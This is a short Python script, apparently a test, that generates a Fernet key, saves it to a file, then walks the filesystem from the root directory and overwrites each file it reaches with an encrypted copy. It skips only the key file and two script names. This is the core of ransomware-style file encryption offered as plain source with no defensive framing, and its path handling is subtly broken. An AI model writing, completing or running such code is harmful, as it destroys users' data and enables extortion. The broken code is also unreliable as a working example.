import os
import subprocess
# List of required libraries to be installed

from cryptography.fernet import Fernet
key=Fernet.generate_key()
with open("thekey.key","wb") as thekey:
    thekey.write(key)
exclude_files = ["test.py", "thekey.key", "decrypt.py"]
for root, _, files in os.walk("/"):
    for file in files:
        if file not in exclude_files:
            with open(file,"rb")as thefile:
                contents=thefile.read()
                contents_encrypted =Fernet(key).encrypt(contents)
            with open(file,"wb")as thefile:
                thefile.write(contents_encrypted)

   
           

    





